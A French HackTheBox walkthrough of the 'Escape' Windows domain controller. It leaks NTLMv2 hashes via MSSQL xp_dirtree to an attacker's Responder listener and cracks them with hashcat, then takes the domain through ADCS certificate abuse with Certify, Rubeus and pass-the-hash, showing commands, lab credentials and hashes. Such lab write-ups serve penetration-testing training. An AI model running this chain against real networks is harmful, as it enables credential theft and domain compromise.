---
title: "Windows Box : Escape"
date: 2023-06-15
comment: true
tags: ["Pentest", "HackTheBox"]
---

## Introduction

Cette box était une machine windows de niveau medium qui faisait intervenir notamment une privesc basée sur la demande de certificat au sein de l'Active Directory!
On va commencer tout de suite en lançant un scan nmap comme pour toutes les boxs HTB.

## Reconnaissance

### Scans

Le scan présente bien toutes les caractéristiques d'un `Domain Controller`, on y voit les ports `445` et `139` pour le smb, le port `88` pour le `TGS` et le service DNS habituel:

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 04:53 EDT
Nmap scan report for 10.10.11.202
Host is up (0.028s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-14 16:53:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-05-13T20:58:31
|_Not valid after:  2053-05-13T20:58:31
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m12s, deviation: 0s, median: 8h00m12s
| smb2-time: 
|   date: 2023-05-14T16:54:11
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.07 seconds
```

On remarque aussi un serveur `MSSQL` sur le port `1433`.

Après avoir simplement essayé de se connecter au serveur smb et rajouté le nom de domaine du DC dans notre hostfile, On va essayer de se connecter au smb en `NULL Authentication` avec crackmapexec. Il s'avère que pour que la NULL Authentication fonctionne il faut que le nom d'utilisateur ne soit pas existant sur la machine, on peut prendre un nom aléatoire et essayer de lister les shares disponibles:

```txt
cme smb 10.10.11.202 --shares -u 'g' -p ''    
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\g: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```
Ok visiblement on a accès en lecture à une share inhabituelle: `Public`. On va maintenant utiliser `smbclient` pour lister les fichiers disponibles dessus:

```txt
smbclient -N -U 'g' //10.10.11.202/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1462488 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (306.3 KiloBytes/sec) (average 306.3 KiloBytes/sec)
smb: \> exit
```

Jetons un oeil au PDF que nous venons de récupérer:

<div>
    <img src="assets/PDF_bonus.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>

A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants 😁, on va aller jeter un oeil là bas.

### Accès à la base de données

Pour se connecter à une base de données MSSQL sous linux il est possible d'utiliser `sqsh` ou l'utilitaire proposé par `Impacket`, ce que nous allons faire ici:

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb
```

## Obtention des premiers creds

Ok donc il n'y a que les bases de données par défault de MSSQL, cela ne sert à rien d'aller chercher à l'intérieur. Pour obtenir un foothold sur le serveur il va soit nous falloir obtenir les creds du compte sur lequel tourne le serveur SQL, soit arriver à RCE tout de suite. C'est sur la première option que l'on va se concentrer pour avancer.

### Relay attack sur le compte MSSQL

Malheureusement la commande `xp_cmdshell` permettant d'exécuter des commandes n'est pas accessible, après quelque recherches on tombe sur une méthode d'exploitation qui permet de mettre en place une `Relay attack` à partir d'un accès MSSQL: En utilisant la commande `xp_dirtree` qui permet d'accéder à une resssource distante.

En effet si on fait en sorte que le serveur fasse une requete SMB vers un serveur que l'on contrôle, pour s'authentifier il enverra son hash `NTLMv2` que nous pourrons cracker en offline. On va donc lancer notre serveur SMB avec l'outil `Responder` sur l'interface connectée au VPN comme ceci:

```txt
sudo responder -I tun0
```

On lance ensuite la requete SMB vers notre machine depuis le serveur MSSQL:

```txt
SQL> xp_dirtree '\\10.10.14.34\test'
```

Et on obtient les hash du compte `sql_svc` sur lequel tourne le serveur:

```txt
[+] Listening for events...                                                                                                                                                                                        

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8795c31e953d3cb4:FA875D8F149BE0462933AF6BC3AEB7CB:01010000000000000003A987799FD901ECF16D600E6BBEFB00000000020008004F0043004F00590001001E00570049004E002D00340038004F0039004E0057003700420039004F004B0004003400570049004E002D00340038004F0039004E0057003700420039004F004B002E004F0043004F0059002E004C004F00430041004C00030014004F0043004F0059002E004C004F00430041004C00050014004F0043004F0059002E004C004F00430041004C00070008000003A987799FD90106000400020000000800300030000000000000000000000000300000F13673A0A84F1123BC030B1965AC9686C878500990100A183A4A1D42B4336C9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330034000000000000000000
```

Et il ne reste plus qu'à le cracker avec hashcat:

```txt
hashcat -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
...
SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be0462933af6bc3aeb7cb:01010000000000000003a987799fd901ecf16d600e6bbefb00000000020008004f0043004f00590001001e00570049004e002d00340038004f0039004e0057003700420039004f004b0004003400570049004e002d00340038004f0039004e0057003700420039004f004b002e004f0043004f0059002e004c004f00430041004c00030014004f0043004f0059002e004c004f00430041004c00050014004f0043004f0059002e004c004f00430041004c00070008000003a987799fd90106000400020000000800300030000000000000000000000000300000f13673a0a84f1123bc030b1965ac9686c878500990100a183a4a1d42b4336c9f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330034000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be04629...000000
Time.Started.....: Thu Jun 15 11:21:43 2023 (14 secs)
Time.Estimated...: Thu Jun 15 11:21:57 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   755.7 kH/s (1.59ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10700800/14344385 (74.60%)
Rejected.........: 0/10700800 (0.00%)
Restore.Point....: 10698752/14344385 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPIN210 -> REDOCEAN22
Hardware.Mon.#1..: Util: 62%

Started: Thu Jun 15 11:21:42 2023
Stopped: Thu Jun 15 11:21:58 2023
```

## Obtention du foothold sur le Domain controller

Nickel! Maintenant il va nous falloir obtenir un shell sur  DC, on peut commencer par voir si le service `WinRM` est utilisé par ce dernier:

```txt
cme winrm 10.10.11.202                                                                       
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
```

`WSMan` est utilisé donc `WinRM` doit l'être aussi, on va tenter de se connecter avec evil-winrm sur le compte `sql_svc`:

```txt
evil-winrm -u sql_svc -p REGGIE1234ronnie -i 10.10.11.202     

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Et on obtient notre premier shell sur le DC en tant que `sql_svc` 👍.

## Pivoting puis privesc

### Pivoting

En fouillant à la racine du disque on trouve un dossier `SQLServer` contenant des Logs et dans l'une d'elle quelque chose d'assez intéressant:

```txt
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
```

L'utilisateur `Ryan.Cooper` a essayé de se connecter et c'est trompé en mettant son mot de passe à la place de son nom d'utilisateur, on va pouvoir pivoter sur son compte.

Une fois connecté en tant que Ryan, on peut récupérer le premier flag sur son bureau: `2f60dd9b4e3e3deeec9373f3c70a1011`.

### Privesc

Comme suggéré par le nom du challenge (`ESCcape`), on va se pencher sur les privescs se basant sur les requêtes de certificats du `Certificate Service` de l'Active Directory. Voilà tout d'abord une petite explication sur le fonctionnemnet du Certificate Service:

#### Explication

Le Certificate Service a pour objectif de fournir des certificats utilisés pour du chiffrement ou pour l'authentification par exemple. Pour qu'un utilisateur obtienne un certificat, il faut qu'il envoie une `CSR` (Certificate Signing Request) à la `CA`. Voilà ce que cette requête va contenir:

* La clé publique que l'utilisateur veut associer à son identité sur l'AD.
* Un sujet à qui associer le certificat.
* Un `EKU` (Extended/Enhanced Key Usage), qui définit ce pour quoi le certificat va être utilisé.
* Un `Certificate Templates` qui est un ensemble de règles et de paramètres qui vont être appliqués au certificat comme sa durée de validité par exemple.

Voilà un schéma du procédé d'obtention du certificat:

<div>
    <img src="assets/CSR_schema.png", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>

Ce qui va nous permettre d'élever nos privilèges est une option du template appellée `subjectAltName` qui permet d'associer d'autres identités au certificat. J'ai trouvé une explication à l'existence de cette option [ici](https://posts.specterops.io/certified-pre-owned-d95910965cd2): En fait, associer plusieurs sujets à un seul certificat peut s'avérer utile dans le cas d'un serveur web par exemple qui pourrait gérer plusieurs domaines avec un seul certificat SSL.

Finalement pour que la privesc fonctionne, il faut que notre utilisateur ait les droits de demander un certificat, qu'il puisse spécifier un `EKU` lui permettant de s'authentifier avec son certificat, et il faut que l'option subjectAltName soit disponible. Par chance ces trois contraintes étaient remplies sur cette box. 

#### Exploitation

Pour pouvoir demander un certificat à la CA de l'AD, il faut importer le binaire `certify.exe` sur la machine ce que nous pouvons faire avec evil-winrm comme ceci:

```txt
*Evil-WinRM* PS C:\Users\Ryan.Cooper> upload Certify.exe
Info: Uploading Certify.exe to C:\Users\Ryan.Cooper\Certify.exe

                                                             
Data: 232104 bytes of 232104 bytes copied

Info: Upload successful!
```

Maintenant on peut demander un certificat en spécifiant le template `UserAuthentication` qui spécifie que l'on pourra utiliser ce certificat pour s'identifier et avec l'option `/altname` qui spécifie le second utilisateur à associer à notre certificat, pour une privesc on met donc l'administrateur local du DC.

```txt
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2JtqGlwdUZBoJPQKIjuIZbMfoLIPxw9hNUEoqXy0Cv07G0JZ
Etvuy6eLPwPLFKmZiRZlHEQlJLxqOLRkGAboFbpmTywqWWfAnqSCbjpn0BHlCR8e
0yL2MdsSIDdkcb0cz+SOk+iudsSxxT4ECSE39TBo2XUzMMJ8gBAq+/r1rlUPvE5S
23DPNbXfaVvPS6GC9SFqOrRwz2crMFxVQSvL2TU5y8sOVwHKy5CU7hUcbjJYl4YF
fXERiCodMi0WFL4PgQV6bmJcfoiUmn1l+FiMvu/FuIgY/m6Jhw8pNdwXzk9bfspM
3hG00Lm2m/fVA2S+/UpVVT+sgzEiITBMu7j2HQIDAQABAoIBAQDQf+kGLpzaIlLd
HzuR8BQ/MMjE+iFNz3QWuv3VB4CXA2KdvqPXD3Uw+7mBkrkszoRH/RKevsmyLttg
cePXbO6B28cXdr/dB43WJyyVxgqfslnxCc+2FPU+0E0GTcuV4B+Xzb2gil1FXdhw
sF1aHGuszEhg6fu4d7032FhH7S4H+3r9VrX/a481LI3dhoLbAqvEsnd+QuqKZwnJ
LsNtt65O6DMNoJa/TKWs5FHiPDQv6xFYkNtN9K3W2riTh4eJyAfydKBGbLLMe9CL
3N5tunVqS2Mu3SOPAPp82DcTJZ73EV5oLZRaccJqA/v+LnYqblNWiiq5CRl9OYoA
JwfVy8XRAoGBAPjc5kltXiuxehD3HxYr15OSylvxfH/wE1H/T9ckFrgm8Wtqcy8A
GxbXXllPLghy7Drjae5393zwgclkvlrkR7ddtkGRaSFHO15zS38SHCnt64cNBcqj
qGGv97aP9MipxZWLo1hSsNDPjGCSJ7ewKMKGxpu9gqObkXik8Wx1HeDLAoGBAN7R
swySBWYS/3VjI71zuE/OhPntfwC1s5HVWaRz0LTO0tZkQBMGDOjuEYvD/CuVNUMB
xcAu6oaaH2CmOyYOv96lJkXq9j1WcNqBt4RkHSy6MNAR6t1o1D0+RP7+zh/OdPDx
Zi2RicbBPpU40/n3rphvk8YL0QXT0v3nHXQqSC+3AoGAAYD0M0Vh6EmuPyP/IBcr
ukyMxHl1EyDUPQ6Z4Obq7DnwA4IlKAeMIlsyyr9bu9lV7BUrsrEu4aZiYmEldU8j
z8vVKhhC1lyj0zJHJoFpgidZ4PsHKe5LOiviB0xfYkcEVp79Ya8+OkTGyF6ZttZt
qJ8/2/kNLQfnnR8CBnG+uHkCgYEAmsGuyBZLJaAgSZm34weShet8NFIdmZKZy7oQ
7sV5uXrEuR8b2ZqkMMvY5+gRJvwU6Bs9C8QKI767+Fa8UiyAWtT9hiYxLFzzOPBL
U+ps0PnomTs4ktsSPg8XwLuc0j6EviwLua6RsLfbDa1QnRbH7xvf2PewD4oVyz9Q
F7SeOnUCgYBjJQuKadpSFCHSQbGpi+xQbAiJGYaas0NBLZ393m3LCh580LKa7QHr
R0tdvEEhrSGUFkS4UvZoBoXEqp3SF7dcBDaPNl1KwQyWcExxdHq+N6HGZeSEKssf
Qug2RmX9zQeP5MaHEU+jKrFC8lViHfkGcWRnBMaJraPCQaFWKDRyGg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAoaz+dKUyVfWQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE2MDAyODUwWhcNMjUwNjE2
MDAzODUwWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDYm2oaXB1RkGgk9AoiO4hlsx+g
sg/HD2E1QSipfLQK/TsbQlkS2+7Lp4s/A8sUqZmJFmUcRCUkvGo4tGQYBugVumZP
LCpZZ8CepIJuOmfQEeUJHx7TIvYx2xIgN2RxvRzP5I6T6K52xLHFPgQJITf1MGjZ
dTMwwnyAECr7+vWuVQ+8TlLbcM81td9pW89LoYL1IWo6tHDPZyswXFVBK8vZNTnL
yw5XAcrLkJTuFRxuMliXhgV9cRGIKh0yLRYUvg+BBXpuYlx+iJSafWX4WIy+78W4
iBj+bomHDyk13BfOT1t+ykzeEbTQubab99UDZL79SlVVP6yDMSIhMEy7uPYdAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAuMQpb7ZsEqSmYgEGOu7y5wj1Ms
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAN2rOzjeX+iCItQ86bpsxsQm/qc87nobXuC8fO/u/ThRJ3i+aFdLbM0GH
0cSd75zve1oIRTmQOr194m/Riu0kVVco/vHSqN4oJezfgdWf4bwSh60QNTU/ATnp
ei3Zi7GYRPMRxC6CtXHbxohU+aplrXMMZ8noD094ix0jcyE2CG9AI3awle0Xa47U
Ix8b6Njph+m4Kx7UGVdk8ZMoaAx4D1VWnimnQ7qsGL7yi3eGkoH0i2yR5g+9Xd8s
kyPkC1OGGB2610j8CEKrzzkQGHPdhdoIU+kHFmq+zkZUN9MHVGTHI/6uwSs83OuK
EDoXyL/FliGefbiTsT6xpFzmJ1KVlQ==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:12.9065614
```

Comme suggéré par le programme, il nous faut maintenant convertir ce certificat du format `PEM` au format `PFX` pour pouvoir ensuite l'utiliser pour s'identifier auprès du TGS. 

```txt
openssl pkcs12 -in certif.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Maintenant on upload notre certificat fraichement créé ainsi que le binaire de Rubeus, on spécifie l'option `/getcredentials` pour récupérer un `NTHash` de l'administrateur:

```txt
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::59de:dd89:1ace:5e71%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/16/2023 9:08:41 PM
  EndTime                  :  6/17/2023 7:08:41 AM
  RenewTill                :  6/23/2023 9:08:41 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  uRJDexi+PljF+Ao9aC33Hw==
  ASREP (key)              :  AE715F3B89BFC48C00CCF0A427E72CD4

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

Finalement il ne nous reste plus qu'à Pass The Hash avec le hash que l'on vient d'obtenir et récupérer le flag root:

```txt
python3 /usr/share/doc/python3-impacket/examples/psexec.py sequel.htb/Administrator@10.10.11.202 -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

